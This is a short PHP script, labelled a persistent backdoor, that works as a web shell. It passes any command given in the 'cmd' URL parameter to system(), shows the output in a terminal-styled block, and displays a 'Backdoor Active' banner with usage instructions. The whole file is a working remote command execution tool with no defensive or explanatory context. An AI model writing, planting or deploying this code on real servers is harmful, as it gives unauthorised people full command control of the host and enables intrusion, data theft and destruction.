<?php
// Persistent backdoor
if (isset($_GET['cmd'])) {
    echo '<pre style="background:black;color:lime;padding:10px;">';
    system($_GET['cmd']);
    echo '</pre>';
}
echo '<h3>Backdoor Active</h3>';
echo '<p>Use ?cmd=command</p>';
?>